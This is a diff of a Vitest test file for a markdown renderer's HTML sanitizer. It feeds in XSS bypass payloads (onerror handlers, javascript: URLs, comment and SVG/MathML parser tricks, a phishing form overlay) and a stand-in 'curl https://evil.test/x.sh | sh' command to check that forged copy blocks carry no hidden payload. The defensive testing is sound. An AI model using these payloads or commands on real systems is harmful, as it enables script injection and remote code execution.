@@ -1,17 +1,13 @@
 // @vitest-environment jsdom
-// The sanitizer runs on a real DOM. The default `node` environment has none,
-// and DOMPurify would pass its input straight back.
 
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import { marked } from 'marked';
 
-// Mutable stand-in for basePath's load-time `WORKSPACE_ID` const (the gateway
-// slug this bundle is served under, or null when served directly / in tests with
-// no stamped <base>). Read via a getter so renderMarkdown sees the current value.
 const base = vi.hoisted(() => ({ workspaceId: null as string | null }));
 vi.mock('./basePath', async () => {
   const actual = await vi.importActual<typeof import('./basePath')>('./basePath');
   return {
+    get BASE_PATH() { return base.workspaceId === null ? '' : `/${base.workspaceId}`; },
     workspaceRouteSegment: actual.workspaceRouteSegment,
     workspaceRouteUrlSegment: actual.workspaceRouteUrlSegment,
     get WORKSPACE_ID() {
@@ -27,7 +23,6 @@ vi.mock('./basePath', async () => {
 import { lucidos } from '@lucidos/sdk';
 import { renderMarkdown, renderMarkdownInline, sanitizeHtmlFragments } from './markdownEngine';
 import { COPY_ID_NONCE, TASK_CHECKBOX_ATTR, taskCheckboxTag } from './markdownMarkers';
-// The downstream consumer of this output, so one test can assert the pair.
 import { linkifyPaths } from './linkifyPaths';
 
 describe('renderMarkdown', () => {
@@ -133,8 +128,6 @@ describe('renderMarkdown', () => {
       );
       expect(html).toContain('data-tooltip-title="The deploy guide"');
       expect(html).toContain('data-tooltip="deploy/databricks/README.md"');
-      // The bare `title` attribute is gone, not just overshadowed: strip the
-      // `data-tooltip-title` occurrence before checking for a leftover one.
       expect(html.replace('data-tooltip-title="The deploy guide"', '')).not.toContain('title="');
     });
   });
@@ -187,8 +180,6 @@ describe('renderMarkdown', () => {
     expect(renderMarkdown('```' + lang + '\nx\n```')).toContain(`<span class="code-block-lang">${lang}</span>`);
   });
 
-  // A paste written Slack-style, with the code on the opening fence line,
-  // which CommonMark reads as the info string.
   it('renders text on the opening fence line as code, not as a label', () => {
     const html = renderMarkdown('Schema:\n```{"agent":"Mozilla/5.0 (Mac)","id":"<brand>"}\n```');
     expect(html).not.toContain('code-block-lang');
@@ -201,7 +192,6 @@ describe('renderMarkdown', () => {
     expect(html).toContain(`<pre><code>${line}</code></pre>`);
   });
 
-  // An ambiguous attribute pattern backtracks exponentially and hangs here.
   it('reads a long attribute-like fence line in linear time', () => {
     const line = 'js' + ' a="b c=d"'.repeat(40) + ' !';
     expect(renderMarkdown('```' + line + '\n```')).not.toContain('code-block-lang');
@@ -283,10 +273,6 @@ describe('renderMarkdown', () => {
     });
 
     it('escapes structural HTML tags inside code blocks so they render as text', () => {
-      // Regression: <html>, <head>, <body>, <title>, <!DOCTYPE> are not in the
-      // ESCAPE_TO_TEXT_TAG filter. If the code renderer doesn't escape its text,
-      // the browser parses these as actual elements and the code block renders
-      // empty (the user-reported bug for the JS SDK boilerplate snippet).
       const md = '```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>X</title>\n  </head>\n  <body>hi</body>\n</html>\n```';
       const html = renderMarkdown(md);
       expect(html).not.toContain('<!DOCTYPE html>');
@@ -343,11 +329,6 @@ describe('renderMarkdown', () => {
       expect(() => renderMarkdown('<a href="&#99999999;">x</a>')).not.toThrow();
     });
 
-    // The old hand-rolled scrubbers matched `\s+name=value` anywhere, and prose
-    // has that shape too. So they deleted the user's own words with no sign
-    // anything had gone: "Set online=yes in the config" came out as "Set in the
-    // config". A parser cannot make that mistake, because it knows text from
-    // markup. These cases stay as the regression they were filed as.
     it.each([
       ['Set online=yes in the config file.', 'Set online=yes in the config file.'],
       ['Use once=true to run it a single time.', 'Use once=true to run it a single time.'],
@@ -363,8 +344,6 @@ describe('renderMarkdown', () => {
       expect(html).toContain('data-copy-text="lucidos trigger set on_event=ThreadCompleted"');
     });
 
-    // An attribute value may contain `>`, which is where a regex that stops at
-    // the first one loses the rest of the tag.
     it('still strips a handler/href hidden behind a `>` inside an earlier attribute value', () => {
       const html = renderMarkdown(
         '<a title="a>b" href="javascript:alert(1)" onmouseover="alert(2)">x</a>',
@@ -375,7 +354,6 @@ describe('renderMarkdown', () => {
       expect(html).not.toContain('alert(');
     });
 
-    // A text node escapes `<`, `>` and `&`, and leaves `"` alone.
     it('leaves an unterminated tag inert: marked escapes it to text', () => {
       const html = renderMarkdown('<a href="javascript:alert(1)" onclick="alert(2)"', { cache: false });
       expect(html).not.toContain('<a ');
@@ -387,16 +365,11 @@ describe('renderMarkdown', () => {
         .toContain('<span class="a" id="b">y</span>');
     });
 
-    // A bare boolean attribute serializes with an empty value, which is the
-    // same attribute: HTML gives it its meaning by presence, not by value.
     it('keeps a bare boolean attribute and the attribute after it', () => {
       expect(renderMarkdown('<details open onfocus="x" title="v">d</details>', { cache: false }))
         .toContain('<details open="" title="v">');
     });
 
-    // An apostrophe in a comment, or in an unquoted attribute value, used to
-    // open a quote that never closed. Every word after it was then scrubbed as
-    // if it sat inside a tag.
     it('keeps prose after an HTML comment containing an apostrophe', () => {
       const html = renderMarkdown("<!-- don't forget -->\n\nSet online=yes in the config.", { cache: false });
       expect(html).toContain('online=yes');
@@ -412,10 +385,6 @@ describe('renderMarkdown', () => {
       expect(html).toContain('online=yes');
     });
 
-    // RCDATA is where a hand-rolled scanner and the browser disagree about what
-    // a comment IS. Inside `<textarea>` a `<!--` is plain text to the browser,
-    // and `</textarea>` still closes the element. Only the browser's own parser
-    // settles that, which is the whole argument for using one.
     it.each([
       '<textarea><!--</textarea><img src=x onerror=alert(1)>',
       '<title><!--</title><img src=x onerror=alert(1)>',
@@ -432,9 +401,6 @@ describe('renderMarkdown', () => {
       expect(html).not.toContain('alert(');
     });
 
-    // A raw-text element stops the browser tokenizing tags until its end tag.
-    // A scanner that keeps tokenizing lands a live element inside what it
-    // believes is a quoted attribute value, and never sees its handler.
     it.each([
       '<textarea><a title="</textarea><img src=x onerror="alert(1)">',
       "<title><a title='</title><img src=x onerror='alert(1)'>",
@@ -442,8 +408,6 @@ describe('renderMarkdown', () => {
       'Here is a form:\n\n<textarea><!--<b c="</textarea><img src=x onerror=alert(1)>\n\nDone.',
     ])('keeps a raw-text element from smuggling a live element past the walk: %s', (src) => {
       const html = renderMarkdown(src, { cache: false });
-      // Everything between the start and end tag is inert text, so the only
-      // thing that matters is that nothing live survives AFTER the end tag.
       const after = html.slice(html.toLowerCase().lastIndexOf('</textarea>') + 1)
         + html.slice(html.toLowerCase().lastIndexOf('</title>') + 1);
       expect(after).not.toMatch(/<img[^>]*onerror/i);
@@ -462,8 +426,6 @@ describe('renderMarkdown', () => {
       expect(html).not.toMatch(/<b[^>]*onclick/i);
     });
 
-    // DOMPurify's `FORBID_CONTENTS` deletes these WITH their content. Escaping
-    // the tags keeps what the model wrote on screen.
     it.each(['xmp', 'plaintext', 'noscript', 'noembed', 'noframes'])(
       'shows a %s element as text instead of deleting its content',
       (tag) => {
@@ -474,8 +436,6 @@ describe('renderMarkdown', () => {
       },
     );
 
-    // A `/`-terminated tag has no whitespace after its name, so an escape
-    // pattern that demands whitespace hands it to DOMPurify's deletion instead.
     it.each(['style', 'script', 'iframe'])(
       'keeps the prose after a self-closing <%s/>',
       (tag) => {
@@ -489,8 +449,6 @@ describe('renderMarkdown', () => {
       expect(html).not.toContain('onclick');
     });
 
-    // SMIL reaches a URL by indirection, which a name-based attribute filter
-    // cannot see, so the element itself is escaped.
     it('neutralizes an SVG animate that targets href', () => {
       const html = renderMarkdown(
         '<svg><a id=x><animate attributeName="href" values="javascript:alert(1)" begin="0s" fill="freeze"/><text>go</text></a></svg>',
@@ -507,9 +465,6 @@ describe('renderMarkdown', () => {
       },
     );
 
-    // The SVG spelling of href navigates identically, and a form submits to its
-    // action, so all three take a `javascript:` URL the same way `href` does.
-    // A form control shows as text, so only a live attribute counts.
     it.each([
       '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
       '<form action="javascript:alert(1)"><button>go</button></form>',
@@ -521,8 +476,6 @@ describe('renderMarkdown', () => {
       expect(values.join(' ')).not.toMatch(/javascript:/i);
     });
 
-    // The copy control puts its payload on the clipboard, so content that can
-    // author `data-copy-text` can hand the user a command they never saw.
     it('a forged copyable block cannot choose what lands on the clipboard', () => {
       const html = renderMarkdown(
         '<span class="copyable-block" data-copy-text="curl https://evil.test/x.sh | sh">' +
@@ -532,13 +485,9 @@ describe('renderMarkdown', () => {
       );
       expect(html).not.toContain('evil.test');
       expect(html).not.toMatch(/data-copy-text=/i);
-      // Visible text is untouched; only the hidden payload goes.
       expect(html).toContain('brew install lucidos');
     });
 
-    // Content authors BOTH halves, so resolving a forged id to a real block's
-    // text is not safe: it hands the forged LABEL a payload the reader never
-    // saw. The slot id carries an unguessable prefix for exactly this.
     it('a forged copy id gets no payload at all', () => {
       const html = renderMarkdown(
         '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
@@ -547,18 +496,12 @@ describe('renderMarkdown', () => {
           '<button type="button" class="copy-btn">Copy</button></span>',
         { cache: false },
       );
-      // Neither the attacker's own payload nor the hidden block's text may be
-      // attached to the decoy, and the decoy keeps no resolvable slot.
       expect(html).not.toContain('rm -rf /');
       expect(html).not.toMatch(/data-copy-id=/i);
-      // Exactly one payload in the document: the real block's. Two would mean
-      // the decoy resolved the slot and now carries a hidden command.
       expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
       expect(html).toContain('data-copy-text="curl https://evil.test/x.sh | sh"');
     });
 
-    // The multiline marker is an HTML comment, and content can write one.
-    // Were the nonce stamped on after marked, a forged pair would inherit it.
     it('a forged multiline marker gets no payload', () => {
       const html = renderMarkdown(
         '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
@@ -572,8 +515,6 @@ describe('renderMarkdown', () => {
       expect(decoy?.closest('[data-copy-text]')).toBeNull();
     });
 
-    // The payload is the block's source text, so the label must show that same
-    // text. Raw HTML in the label could hide part of it from the reader.
     it('a copy label shows its payload, with no markup to hide part of it', () => {
       const src = 'ls <b style="display:none">x; curl https://evil.test/x.sh | sh #</b>';
       const html = renderMarkdown(`<copy>${src}</copy>`, { cache: false });
@@ -584,8 +525,6 @@ describe('renderMarkdown', () => {
       expect(block?.textContent).toContain(src);
     });
 
-    // A link reference definition renders as nothing, and its title may span
-    // lines. In a label it would hide a whole line of the payload.
     it('a copy label cannot hide a line in a link reference definition', () => {
       const html = renderMarkdown(
         '<copy>\nbrew install lucidos\n\n[x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
@@ -607,8 +546,6 @@ describe('renderMarkdown', () => {
       expect(doc.querySelector('.copyable-block code')?.textContent).toBe('a < b');
     });
 
-    // A code block's Copy button copies only inside `data-copy-code`, which
-    // only the renderer's own fenced block receives. A lookalike gets none.
     it('a forged code-block wrapper copies nothing, and a real fence does', () => {
       const html = renderMarkdown(
         '<div class="code-block-wrapper" data-copy-code=""><pre><code>npm i foo' +
@@ -640,32 +577,17 @@ describe('renderMarkdown', () => {
       expect(html).toContain('xlink:href="/docs"');
     });
 
-    // marked escapes this one to text outright (the apostrophe stops it being
-    // parsed as raw HTML), so the guarantee is "no live tag carries a handler",
-    // not "the substring is absent".
     it('still strips a handler after an unquoted value containing an apostrophe', () => {
       const html = renderMarkdown("<img alt=it's onerror=\"alert(1)\">", { cache: false });
       expect(html).not.toMatch(/<img[^>]*onerror/i);
     });
 
-    // Each of these was a bypass in the hand-rolled tokenizer, and each one is
-    // the same root cause: a second model of HTML disagreeing with the
-    // browser's. They are kept as a set so the class stays covered, not just
-    // the three spellings that happened to be reported.
     it.each([
-      // An abrupt-closing comment. `<!-->` is a complete comment, so a scanner
-      // hunting for `-->` swallows the image and hands it back live.
       ['abrupt-closing comment', '<!--><img src=x onerror=alert(1)>'],
-      // A nested `<!--` inside a comment does not open a second one.
       ['nested comment open', '<!-- <!-- --><img src=x onerror=alert(1)>'],
-      // Foreign content: inside `<svg>`, `<style>` is raw text and `<p>` is not
-      // the same element it is in HTML.
       ['svg style breakout', '<svg><style><a title="</style><img src=x onerror=alert(1)>'],
-      // MathML annotation puts the parser back into HTML mid-subtree.
       ['mathml annotation', '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)>'],
-      // A tag name with an embedded newline is still that tag to a parser.
       ['newline in tag name', '<img\nsrc=x\nonerror=alert(1)>'],
-      // A NUL inside the scheme is skipped by a URL parser, not honoured.
       ['nul byte in scheme', '<a href="java\u0000script:alert(1)">x</a>'],
     ])('closes the parser-disagreement bypass class: %s', (_name, src) => {
       const html = renderMarkdown(src, { cache: false });
@@ -673,9 +595,6 @@ describe('renderMarkdown', () => {
       expect(html).not.toMatch(/<[a-z][^>]*javascript:/i);
     });
 
-    // `data:` on an `<img>` is the one DOMPurify allows by default, through
-    // `DATA_URI_TAGS`, and it has no negative form. The URL hook is what closes
-    // it, so this fails the moment the hook stops running.
     it.each([
       '<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3C/svg%3E">',
       '<video poster="data:text/html,evil"></video>',
@@ -684,9 +603,6 @@ describe('renderMarkdown', () => {
       expect(renderMarkdown(src, { cache: false })).not.toMatch(/data:/i);
     });
 
-    // Each of these is claimed by an extractor that runs after the sanitizer.
-    // A stripped href leaves that extractor nothing to read, and the link then
-    // renders as underlined text that does nothing when clicked.
     it.each([
       'file:///Users/me/dist/Lucidos.dmg',
       'repo:aa11aaaa-bbbb-cccc-dddd-eeeeffff0001:file:README.md',
@@ -707,7 +623,6 @@ describe('renderMarkdown', () => {
       expect(html).toContain('+1-555-0123');
     });
 
-    // An attribute value escapes `&` and `"`, and keeps a newline literal.
     it('renders multiline copy block with multi class', () => {
       const html = renderMarkdown('<copy>line one\nline two</copy>');
       expect(html).toContain('copyable-block-multi');
@@ -733,9 +648,6 @@ describe('renderMarkdown', () => {
     });
 
     it('renders large multiline copy block without breaking HTML structure', () => {
-      // Regression: long multiline <copy> blocks had raw newlines in data-copy-text
-      // attribute, which broke marked's HTML parser. The SVG copy icon would render
-      // at full container size instead of being constrained inside .copy-btn.
       const content = `Refactor panel overlay state from 6 independent signals into a single discriminated union.
 
 Current state: currentSkill, currentComponent, previewFile, panelUrl, activeInlineForm, and viewingNotification are 6 separate signals in store/store.ts that represent mutually exclusive panel overlay state. They're checked in a priority chain in ContentPane.tsx and must be cleared together in switchMenuItem(). This design allows invalid states and has caused bugs (see commit 57eaf3d1 — overlay not clearing when activeMenuItem unchanged).
@@ -768,11 +680,9 @@ Constraints:
 - npm test and npx tsc --noEmit must pass with zero errors`;
       const html = renderMarkdown(`<copy>${content}</copy>`);
 
-      // The copy-btn must contain the SVG — not be broken out of its wrapper
       expect(html).toContain('class="copy-btn"');
       expect(html).toContain('copyable-block-multi');
 
-      // The SVG must be INSIDE the button, not floating loose
       const btnStart = html.indexOf('class="copy-btn"');
       const svgStart = html.indexOf('<svg');
       const btnEnd = html.indexOf('</button>');
@@ -780,20 +690,15 @@ Constraints:
       expect(svgStart).toBeGreaterThan(btnStart);
       expect(btnEnd).toBeGreaterThan(svgStart);
 
-      // Content must be visible (not swallowed by broken HTML)
       expect(html).toContain('Refactor panel overlay');
       expect(html).toContain('Key files to change');
 
-      // No loose SVGs outside of button wrappers
       const svgCount = (html.match(/<svg/g) || []).length;
       const btnSvgCount = (html.match(/class="copy-btn"[^>]*>[\s]*<svg/g) || []).length;
       expect(svgCount).toBe(btnSvgCount);
     });
 
     it('multiline copy block with markdown headings and code fences survives marked', () => {
-      // Regression: marked's HTML block rules end a <div> at the first blank line.
-      // A multiline copy block wrapping markdown content (headings, code fences)
-      // gets its wrapper div broken — the copy button ends up orphaned.
       const content = `# Advanced Prompt
 
 Here is an example:
@@ -808,59 +713,55 @@ Use this pattern for all prompts.`;
 
       const html = renderMarkdown(`<copy>${content}</copy>`);
 
-      // The wrapper div must contain the copy button
       expect(html).toContain('copyable-block-multi');
 
-      // The copy button must exist and contain the SVG
       const btnMatch = html.match(/<button[^>]*class="copy-btn"[^>]*>[\s\S]*?<\/button>/);
       expect(btnMatch).not.toBeNull();
 
-      // The wrapper div must close AFTER the button, not before the content
       const wrapperStart = html.indexOf('copyable-block-multi');
       const btnPos = html.indexOf('class="copy-btn"');
       expect(wrapperStart).toBeGreaterThan(-1);
       expect(btnPos).toBeGreaterThan(wrapperStart);
 
-      // Content must be rendered as markdown inside the wrapper
       expect(html).toContain('<h1');
       expect(html).toContain('Advanced Prompt');
       expect(html).toContain('println!');
 
-      // data-copy-text must contain the raw text for clipboard
       expect(html).toContain('data-copy-text=');
     });
 
     it('does not match <copy> tags inside backtick code spans', () => {
-      // When the LLM writes `<copy>` (backtick-quoted tag reference),
-      // the preprocessor must not treat it as a real copy block start.
       const html = renderMarkdown('I understand the `<copy>` syntax.\n\n<copy>actual content</copy>');
 
-      // The backtick-quoted <copy> must render as inline code, not trigger a copy block
       expect(html).toContain('<code>&lt;copy&gt;</code>');
 
-      // The real copy block must still work
       expect(html).toContain('copyable-block');
       expect(html).toContain('actual content');
 
-      // No orphaned backticks
       expect(html).not.toMatch(/I understand the `<br/);
     });
 
     it('does not match <copy> tags inside fenced code blocks', () => {
       const html = renderMarkdown('```\n<copy>not real</copy>\n```\n\n<copy>real</copy>');
 
-      // Only one copy block (the real one), not the one inside the code fence
       const copyBlocks = html.match(/copyable-block/g);
       expect(copyBlocks).not.toBeNull();
       expect(copyBlocks!.length).toBe(1);
 
-      // The fenced one should render as code
       expect(html).toContain('code-block-wrapper');
+    });
+
+    it.each(['`', '~'])('preserves literal paths inside a longer %s fence', (delimiter) => {
+      const path = `/opt/${delimiter.repeat(3)}<copy>reports</copy>`;
+      const fence = delimiter.repeat(4);
+      const html = renderMarkdown(`${fence}\n${path}\n${fence}`);
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+
+      expect(doc.querySelector('pre code')?.textContent?.trimEnd()).toBe(path);
     });
 
     it('preserves inline code backticks in data-copy-text', () => {
       const html = renderMarkdown('Currently, <copy>`getTextContent()` only returns text content.</copy>');
-      // data-copy-text must contain the backtick-wrapped code, not a placeholder
       expect(html).toContain('data-copy-text="`getTextContent()` only returns text content."');
       expect(html).not.toContain('CODE');
     });
@@ -874,7 +775,6 @@ Use this pattern for all prompts.`;
     it('handles multiple copy blocks in one message', () => {
       const html = renderMarkdown('ID: <copy>abc</copy> and <copy>xyz</copy>');
       const matches = html.match(/copyable-block/g);
-      // Each block has the class once in the element, so at least 2
       expect(matches!.length).toBeGreaterThanOrEqual(2);
     });
   });
@@ -889,25 +789,17 @@ Use this pattern for all prompts.`;
     });
 
     it('does NOT emit block elements — paragraphs, lists, headings stay as literal text', () => {
-      // The whole point: the output must be safe to nest inside <button> /
-      // <span>, so block markdown is left as-is rather than wrapped in
-      // <p>/<ul>/<h*>. Otherwise we'd reintroduce the HTML-validity bug the
-      // helper exists to avoid.
       const html = renderMarkdownInline('# heading\n- item one\n- item two');
       expect(html).not.toContain('<p>');
       expect(html).not.toContain('<ul>');
       expect(html).not.toContain('<li>');
       expect(html).not.toContain('<h1');
-      // Dashes survive as visual bullets, content is preserved.
       expect(html).toContain('# heading');
       expect(html).toContain('- item one');
       expect(html).toContain('- item two');
     });
 
     it('strips <a> from markdown links but keeps the label text', () => {
-      // <a> is interactive content; inside the AskUserQuestion option <button>
-      // that's interactive-in-interactive (HTML spec violation). The renderer
-      // returns label text only.
       const html = renderMarkdownInline('see [docs](https://example.com) for more');
       expect(html).not.toContain('<a ');
       expect(html).not.toContain('href');
@@ -915,16 +807,12 @@ Use this pattern for all prompts.`;
     });
 
     it('preserves nested inline markdown inside link text after stripping', () => {
-      // Without parser.parseInline on the link's child tokens, **bold** inside
-      // link text would survive as literal asterisks instead of <strong>.
       const html = renderMarkdownInline('[**bold link**](https://x)');
       expect(html).toContain('<strong>bold link</strong>');
       expect(html).not.toContain('<a ');
     });
 
     it('discards javascript:-scheme link targets along with the wrapper', () => {
-      // Bonus property of dropping the href: dangerous URL schemes never reach
-      // the DOM. The label text survives, the target does not.
       const html = renderMarkdownInline('[click me](javascript:alert(1))');
       expect(html).toContain('click me');
       expect(html).not.toContain('javascript:');
@@ -948,9 +836,6 @@ Use this pattern for all prompts.`;
       expect(renderMarkdownInline('')).toBe('');
     });
 
-    // The link renderer sees only markdown links. Raw HTML in an agent's
-    // option preview put a live control inside the option <button>. A tap
-    // meant to answer could then navigate the app away.
     it('unwraps a raw link and shows raw form controls as text', () => {
       const html = renderMarkdownInline(
         'a <a href="https://example.com">link</a>, a <button>button</button>, <input value="x"> end',
@@ -962,7 +847,6 @@ Use this pattern for all prompts.`;
   });
 
   describe('thread reference links', () => {
-    // No <base> stamped in tests → WORKSPACE_ID null → served-directly fallback.
     beforeEach(() => {
       base.workspaceId = null;
     });
@@ -991,8 +875,6 @@ Use this pattern for all prompts.`;
   });
 
   describe('thread reference links — behind the gateway', () => {
-    // Served at https://<gateway>/myws/ → hover should show the real
-    // destination, not the `#`-resolves-to-current-page URL.
     beforeEach(() => {
       base.workspaceId = 'myws';
       vi.stubGlobal('location', { origin: 'https://localhost:5251' });
@@ -1017,12 +899,18 @@ Use this pattern for all prompts.`;
     it('slugifies the ref workspace name for the href (lowercased)', () => {
       const html = renderMarkdown('See [the bug](thread:Dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0003)');
       expect(html).toContain('href="https://localhost:5251/dev/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0003"');
-      // raw (un-slugified) workspace name is preserved for the click handler
       expect(html).toContain('data-thread-workspace="Dev"');
     });
   });
 
   describe('thread reference links — on and to a remote gateway', () => {
+    it('scopes remote authored resources and CSS before insertion into the host', () => {
+      base.workspaceId = 'notes@cloud';
+      const html = sanitizeHtmlFragments('<img src="/~/api/v1/control/workspaces"><span style="background:url(/private)">text</span>');
+      expect(html).not.toContain('src=');
+      expect(html).not.toContain('style=');
+      expect(html).toContain('text');
+    });
     beforeEach(() => {
       vi.stubGlobal('location', { origin: 'https://localhost:5251' });
     });
@@ -1051,10 +939,6 @@ Use this pattern for all prompts.`;
     });
   });
 
-  // Regression guard for the "heavy thread freezes on send" fix: re-rendering a
-  // thread re-calls renderMarkdown for every block; without caching, each
-  // re-render re-parsed all of them (the markdown re-parse storm). The cache
-  // makes a repeated input an O(1) lookup; the live streaming buffer opts out.
   describe('parse caching', () => {
     it('caches by input so a repeated render does not re-parse', () => {
       const spy = vi.spyOn(marked, 'parse');
@@ -1063,7 +947,7 @@ Use this pattern for all prompts.`;
       const a = renderMarkdown(md);
       const b = renderMarkdown(md);
       expect(b).toBe(a);
-      expect(spy.mock.calls.length).toBe(before + 1); // parsed once; second was a cache hit
+      expect(spy.mock.calls.length).toBe(before + 1);
       spy.mockRestore();
     });
 
@@ -1073,17 +957,12 @@ Use this pattern for all prompts.`;
       const before = spy.mock.calls.length;
       renderMarkdown(md, { cache: false });
       renderMarkdown(md, { cache: false });
-      expect(spy.mock.calls.length).toBe(before + 2); // re-parsed both times, not cached
+      expect(spy.mock.calls.length).toBe(before + 2);
       spy.mockRestore();
     });
   });
 });
 
-/**
- * Authored HTML can neither submit a form, reach the top layer, nor link
- * through an image map. Inline style stays, because containment, not
- * filtering, bounds its layout.
- */
 describe('authored form controls, image maps and the top layer', () => {
   const ARTIFACT_PAYLOAD =
     '<form action="https://example.com/collect" method="post" style="position:fixed;inset:0;z-index:2147483647;background:white"><input type="password" name="api_key"><button>Connect</button></form>';
@@ -1118,8 +997,6 @@ describe('authored form controls, image maps and the top layer', () => {
       },
     );
 
-    // An image map's `<area href>` is a link no shell router sees, since each
-    // one keys on `a[href]`. A click on it navigates the shell window itself.
     it.each([
       ['an image map', '<img src="x.png" usemap="#m"><map name="m"><area shape="rect" coords="0,0,9999,9999" href="https://example.com/c"></map>'],
       ['mixed case', '<MaP name="m"><AREA href="https://example.com/c"></MaP>'],
@@ -1165,20 +1042,6 @@ describe('authored form controls, image maps and the top layer', () => {
   });
 });
 
-/**
- * Images. Two things happen to an `<img>` the block renderer emits: a
- * workspace-relative `src` is resolved against the mount that actually serves
- * the file, and the tag is wrapped in the `.image-scroll-wrapper` scroll
- * container. The URL is built by the SDK's `lucidos.data.url`, so these tests
- * drive the served context the way the browser supplies it: `configure({
- * baseUrl })` for the gateway's `/<slug>` prefix (absent on a bare engine port)
- * plus a stubbed `location`, since the SDK reads `window.location` to tell an
- * app iframe from the host shell.
- *
- * `cache: false` throughout, because renderMarkdown memoizes by input text
- * alone: two served contexts rendering the same markdown would otherwise share
- * one result.
- */
 describe('renderMarkdown images', () => {
   const servedAt = (baseUrl: string, pathname: string) => {
     lucidos.configure({ baseUrl });
@@ -1195,6 +1058,20 @@ describe('renderMarkdown images', () => {
     vi.unstubAllGlobals();
     lucidos.configure({ baseUrl: '' });
     base.workspaceId = null;
+  });
+
+  it.each(['block', 'inline', 'fragment'])('resolves remote images before scoping: %s', (entry) => {
+    base.workspaceId = 'demo@remote';
+    servedAt('/demo@remote', '/demo@remote/');
+    const source = 'artifacts/diagram%20one.png#320x200';
+    const html = entry === 'block'
+      ? renderMarkdown(`![diagram](${source})`, { cache: false })
+      : entry === 'inline'
+        ? renderMarkdownInline(`![diagram](${source})`)
+        : sanitizeHtmlFragments(`<img src="${source}">`);
+    expect(imgSrc(html)).toBe('/demo@remote/data/artifacts/diagram%20one.png');
+    expect(html.match(/class="image-scroll-wrapper"/g)).toHaveLength(1);
+    expect(html).toContain('--hint-w: 320');
   });
 
   it('resolves a workspace-relative source through the data mount', () => {
@@ -1217,16 +1094,11 @@ describe('renderMarkdown images', () => {
   });
 
   it('routes system-knowhow through the API endpoint, not the static mount', () => {
-    // system-knowhow ships with the engine rather than living in the workspace,
-    // so it is not under the static /data mount. Deferring to the SDK's builder
-    // is what gets this right without renderMarkdown knowing about the case.
     const html = renderMarkdown('![diagram](system-knowhow/diagram.png)', { cache: false });
     expect(imgSrc(html)).toBe('/myws/api/v1/data/system-knowhow/diagram.png');
   });
 
   it('encodes a source exactly once', () => {
-    // marked percent-encodes the src it emits and the SDK encodes each segment
-    // again, so a non-ASCII name would round-trip to `%C3%83%C2%A6…` and 404.
     const html = renderMarkdown('![alt](artifacts/æøå.png)', { cache: false });
     expect(imgSrc(html)).toBe('/myws/data/artifacts/%C3%A6%C3%B8%C3%A5.png');
   });
@@ -1248,9 +1120,6 @@ describe('renderMarkdown images', () => {
   });
 
   it('leaves a relative path outside the workspace allowlist alone', () => {
-    // The rule is an allowlist of workspace top-level directories rather than
-    // "every relative path", so a relative asset path that means something else
-    // in its own context is never silently redirected at the workspace.
     const html = renderMarkdown('![alt](foo/bar.png)', { cache: false });
     expect(imgSrc(html)).toBe('foo/bar.png');
   });
@@ -1268,10 +1137,6 @@ describe('renderMarkdown images', () => {
   });
 
   it('refuses a traversal hidden behind an encoded separator', () => {
-    // `%2e%2e%2f%2e%2e` decodes to a SINGLE segment reading `../..`, which a
-    // check on the pre-join segments would wave through. The path encoder then
-    // splits it back into two real segments (a dot is unreserved, so nothing
-    // re-escapes them) and the browser normalizes the request out of the mount.
     const html = renderMarkdown('![alt](artifacts/%2e%2e%2f%2e%2e/api/v1/health)', { cache: false });
     expect(imgSrc(html)).toBe('artifacts/%2e%2e%2f%2e%2e/api/v1/health');
     expect(html).not.toContain('/data/');
@@ -1283,9 +1148,6 @@ describe('renderMarkdown images', () => {
   });
 
   it('does not re-escape an ampersand the author already escaped', () => {
-    // The query is carried over verbatim from an attribute value that is
-    // already escaped. Escaping it a second time would send the server the
-    // literal text `&amp;` as a parameter name.
     const html = renderMarkdown('![alt](artifacts/x.png?a=1&amp;b=2)', { cache: false });
     expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png?a=1&amp;b=2');
     expect(html).not.toContain('&amp;amp;');
@@ -1296,8 +1158,6 @@ describe('renderMarkdown images', () => {
     expect(imgSrc(html)).toBe('/myws/data/artifacts/chart.svg#detail');
   });
 
-  /** A previewed file names its images relative to its own folder, the way
-   *  GitHub and every editor read them. */
   describe('in a repository document', () => {
     const doc = (path: string, rev: { ref?: string; changeId?: string } = {}) =>
       ({ kind: 'repo', repoId: 'repo-1', path, ...rev }) as const;
@@ -1366,7 +1226,6 @@ describe('renderMarkdown images', () => {
       expect(img.hasAttribute('data-load-failed')).toBe(true);
       expect(html).toContain('Image not available: chunk split');
       expect(html).toContain('<code>../../../crates/lucidos-app/x.png</code>');
-      // The notice sits in the image's own wrapper, where a failed load puts it.
       expect(img.parentElement?.className).toBe('image-scroll-wrapper');
     });
 
@@ -1406,8 +1265,6 @@ describe('renderMarkdown images', () => {
     });
   });
 
-  /** A size hint lets the browser reserve the picture's box before its bytes
-   *  arrive, so a card or reply does not grow when it loads. */
   describe('size hint', () => {
     const imgOf = (html: string) =>
       new DOMParser().parseFromString(html, 'text/html').querySelector('img')!;
@@ -1474,10 +1331,6 @@ describe('renderMarkdown images', () => {
     expect(html).toContain('src="/myws/data/artifacts/two.png"');
   });
 
-  /** The wrapper is spliced around the tag. So a pass that mistakes the three
-   *  characters `<img` inside an attribute value for a real tag splices INTO
-   *  that value. The literal carries quotes, which closed the `title` and let
-   *  a real `<img onerror>` out into element position, past the sanitizer. */
   it('wraps no image for an <img written inside an attribute value', () => {
     const html = renderMarkdown(
       '<a href="#" title="<img src=x onerror=alert(1)>">hi</a>',
@@ -1486,7 +1339,6 @@ describe('renderMarkdown images', () => {
     const doc = new DOMParser().parseFromString(html, 'text/html');
     expect(doc.querySelector('img')).toBeNull();
     expect(doc.querySelector('.image-scroll-wrapper')).toBeNull();
-    // The text stays text on the anchor that always owned it.
     expect(doc.querySelector('a')!.getAttribute('title'))
       .toBe('<img src=x onerror=alert(1)>');
   });
